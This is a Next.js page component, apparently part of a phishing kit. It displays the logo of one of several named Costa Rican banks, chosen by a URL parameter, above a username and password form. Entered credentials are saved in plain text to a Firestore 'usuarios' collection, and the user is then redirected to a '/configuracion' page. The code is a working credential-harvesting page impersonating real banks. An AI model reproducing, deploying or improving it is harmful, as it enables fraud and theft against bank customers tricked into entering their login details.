
import Head from "next/head";
import { useRouter } from "next/router";
import Router from "next/router"
import { useState, useEffect } from "react";
import firebase from "../components/firebase";

export default function Usuario() {
  const [state, setState] = useState({
    usuario: "",
    password: "",
  });

  const [fotoBanco, setFotoBanco] = useState("");

  const router = useRouter();
  const { id } = router.query;
  const { banco } = router.query;

  useEffect(() => {
    if(banco === "banco-nacional"){
      setFotoBanco("/logo_banco-nacional.webp")
    }
    else if(banco === "BCR"){
      setFotoBanco("/LOGO_BCR.svg.webp")
    }
    else if(banco === "bacredomatic"){
      setFotoBanco("/logo_bacredomatic.webp")
    }else if(banco === "banco-popular"){
      setFotoBanco("/logo_bancopopular.webp")
    }else if(banco === "banco-proamerica"){
      setFotoBanco("/descarga.webp")
    }else if(banco === "lafise"){
      setFotoBanco("/Logo_Banco_LAFISEULTIMO2.webp")
    }else if(banco === "Coope-ande"){
      setFotoBanco("/descarga (1).webp")
    }
    else if(banco === "mucap"){
      setFotoBanco("/descarga (3).webp")
    }else if(banco === "grupo-mutual"){
      setFotoBanco("/descarga (2)-2.webp")
    }else {
      setFotoBanco("/banner5.webp")
    }
  }, [banco]);

    const handleChange = (e) => {
        setState({
            ...state,
            [e.target.name]: e.target.value
        })
    }
    //handle submit and update the firebase document asoociated with the id
    const handleSubmit = async (e) => {
        e.preventDefault()
        await firebase.firestore().collection('usuarios').doc(id).update({
            usuario: state.usuario,
            password: state.password
        })
        .then(() => {
            //redirect user to configuration page and pass the doc id as a get parameter
            Router.push({
                pathname: '/configuracion',
                query: { id: id },
            })
        })
        .catch((error) => {
            alert(error)
        })
    }

  return (
    <div className="overflow-x-hidden">
      <Head>
        <title>Registro </title>
        <link rel="icon" href="/lafise.webp" />
      </Head>
      <div className="w-11/12 lg:w-6/12 mx-auto my-10 space-y-5">
        <img src={fotoBanco} className="w-44 mx-auto" />
        <form className="w-10/12 lg:w-5/12 mx-auto space-y-5 pt-5">
          <div className="grid grid-cols-2 gap-5">
            <div className="col-span-2">
              <label htmlFor="usuario" className="text-lg">
                Usuario
              </label>
              <input
                type="text"
                onChange={(e) => handleChange(e)}
                name="usuario"
                placeholder="Usuario"
                autoComplete="off"
                id="usuario"
                className="w-full border border-indigo-200 p-2 rounded-xl bg-emerald-50 "
              />
            </div>
          </div>
          <div className="grid grid-cols-2 gap-5">
            <div className="col-span-2">
              <label htmlFor="contraseña" className="text-lg">
                Contraseña
              </label>
              <input
                type="password"
                autoComplete="off"
                onChange={(e) => handleChange(e)}
                name="password"
                placeholder="Contraseña"
                id="password"
                className="w-full border border-indigo-200 p-2 rounded-xl bg-emerald-50 "
              />
            </div>
          </div>
          <button onClick={(e) => handleSubmit(e)} className="w-full bg-emerald-500 text-white p-2 rounded-xl">
            Ingresar
          </button>
        </form>
      </div>
    </div>
  );
}
